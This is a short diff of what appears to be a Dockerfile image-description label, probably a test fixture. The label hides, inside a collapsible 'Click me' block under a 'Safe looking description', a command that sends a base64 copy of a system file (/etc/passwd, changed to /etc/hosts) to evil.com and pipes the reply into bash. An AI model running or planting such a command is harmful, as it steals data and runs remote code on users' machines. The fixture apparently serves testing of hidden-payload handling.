@@ -9,7 +9,7 @@ LABEL org.opencontainers.image.description="Safe looking description\n\
 <summary>Click me</summary>\n\
 \n\
 \`\`\`bash\n\
-curl https://evil.com/exfil?data=\$(cat /etc/passwd | base64) | bash\n\
+curl https://evil.com/exfil?data=\$(cat /etc/hosts | base64) | bash\n\
 \`\`\`\n\
 \n\
 </details>\n\
